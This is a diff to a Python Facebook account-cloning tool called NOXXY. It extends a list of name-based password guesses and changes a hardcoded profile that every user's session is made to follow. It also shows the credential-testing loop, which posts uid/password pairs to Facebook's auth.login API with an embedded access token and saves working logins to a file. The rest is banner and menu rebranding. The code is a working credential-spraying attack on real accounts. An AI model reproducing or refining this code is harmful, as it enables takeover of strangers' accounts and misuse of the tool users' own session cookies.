@@ -296,6 +296,17 @@ def name2():
 					pwv.append(frs+'12345')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'786')
+					pwv.append(frs+'1')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@12')
+					pwv.append(frs+'12')
+					pwv.append(frs+'00')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'102030')
+					pwv.append(frs+'1020')
+					pwv.append(frs+'last')
+					pwv.append(frs+'last123')
+					pwv.append(frs+'last@123')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -383,7 +394,7 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100077561715375', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100092410422263', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
@@ -403,17 +414,17 @@ logo = ("""\033[1;32m
  
   - th'3 metavers'3 god pratik inxxid'3 !  
  
- [√] Author      :  PRATIK-EXE
- [√] Facebook    :  Pratik Gurung
- [√] Github      :  NOXXY-EXE
- [√] Status      :  Free 🪦
+ [√] Author      :  𝗣𝗿𝗮𝘁𝗶𝗸 𝗚𝗼𝗱'𝘇
+ [√] Facebook    :  𝗣𝗥𝗔𝗧𝗜𝗞-𝗘𝗫𝗘
+ [√] Github      :  𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘
+ [√] Status      :  𝗣𝗔𝗜𝗗 ‼️
  
-         pratik inxxid'3 🥷🏻
+         𝗽𝗿𝗮𝘁𝗶𝗸 𝗶𝗻𝘅𝘅𝗶𝗱'𝟯 💀
 	 
 ━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─━─
  
- - Unknown Legend'3
-   Th'3 Metavers'3 god pratik enter'3
+ - 𝗣𝗥𝗔𝗧𝗜𝗞-𝗘𝗫𝗘
+  𝗧𝗵'𝟯 𝗠𝗲𝘁𝗮𝘃𝗲𝗿𝘀'𝟯 𝗴𝗼𝗱 𝗽𝗿𝗮𝘁𝗶𝗸 𝗲𝗻𝘁𝗲𝗿'𝟯
  
 \033[1;37m""")     
  
@@ -427,10 +438,9 @@ class Main:
 		print(logo)
 		print("\n [1] File Cloning")
 		print(" [2] Public Cloning")
-		print(" [3] Create File")
-		print(" [4] 2008-9 Cloning")
+		print(" [4] 2007-10 Cloning")
 		print(" [5] 2010-15 Cloning")
-		print(" [6] Press 'E' & Maa chut jayegi")
+		print(" [6] Press 'E'")
 		print(" [E] Exit Programming\n")
 		NOXXY =input(" Choose : ")
 		if NOXXY in ["1", "01"]:
@@ -862,7 +872,7 @@ class Main:
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ NOXXY-Ok ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-NOXXY-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
@@ -1289,7 +1299,7 @@ class Main:
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ NOXXY-OK ] %s | %s\033[0;97m         "%(uid, pw))
-				print ("\r \033[0;92m Congrats Bro ")
+				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-NOXXY-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
